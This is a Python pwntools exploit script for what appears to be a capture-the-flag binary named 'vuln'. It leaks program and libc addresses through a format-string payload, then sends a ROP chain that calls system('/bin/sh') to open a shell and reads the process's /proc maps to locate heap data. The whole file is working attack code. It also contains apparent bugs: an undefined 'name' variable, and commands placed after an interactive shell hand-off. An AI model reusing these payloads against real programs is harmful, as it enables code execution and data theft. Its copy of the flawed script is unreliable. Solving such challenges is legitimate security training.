#!/usr/bin/env python3
from collections import Counter

from pwn import *

exe = context.binary = ELF('vuln')
context.arch = 'amd64'
libc = ELF("./libc.so.6")

io = process([exe.path])

io.recvuntil(b")?")
io.sendline(b'y')
io.recvuntil(b"?")
io.recvuntil(b"?")
io.recvlines(2)

lines = []

while True:
    line = io.recvline()[3:-1]
    if "?" in str(line):
        print(line)
        break
    else:
        lines.append(line.decode("utf-8"))

c = Counter(lines)
io.sendline(str(c["red"]).encode())
io.recvuntil(b"?")
io.sendline(str(c["yellow"]).encode())
io.recvuntil(b"?")
io.sendline(str(c["blue"]).encode())

io.recvuntil(b"name?")
io.sendline(b'foo')

io.recvuntil(b"else?")
payload = flat({0: b'%p' * 50, 167: chr(0x9b).encode()})  # jump back into task
io.sendline(payload)
io.recvuntil(b"with ")

leak = str(io.recvline())
leak = leak.split('0x')
leak_task = int(leak[27], 16)
leak_libc = int(leak[37].replace('(nil)', ''), 16)

print("leak", leak)
print("leak_task", hex(leak_task))
print("leak_libc", hex(leak_libc))

exe.address = leak_task - (exe.sym['task'] + 427)
libc.address = leak_libc - libc.sym['__libc_start_main'] + 0x30

rop = ROP(libc)
ret = rop.find_gadget(['ret'])

rop.raw(ret)
binsh = next(libc.search(b'/bin/sh\x00'))
rop.system(binsh)
rop.raw(ret)
rop.raw(ret)
rop.raw(ret)
rop.call(exe.sym['tellflag'])

io.recvlines(2)
io.sendline(name)
io.recvuntil(b'else?')

payload = flat({168: rop.chain()})
io.sendline(payload)
io.interactive()
io.sendline(b"PID=$(ps -ef | grep -e vuln | grep -v grep | grep -v socat | tr -s ' ' | cut -d ' ' -f2)")
io.sendline(b"echo ${PID}")
io.sendline(b"cat /proc/${PID}/maps | grep heap")
io.sendline(b"exit")

io.recvlines(5)

heap_addr = io.recvline().decode()
heap_addr = int(heap_addr.split('-')[0], 16)
heap_addr = heap_addr + 0x485

io.recvuntil(b"name?")
io.sendline(b'foo')
io.recvuntil(b"else?")

rop = ROP(libc)
rop.raw(ret)
rop.puts(heap_addr)

payload = flat({168: rop.chain()})
io.sendline(payload)
io.interactive()
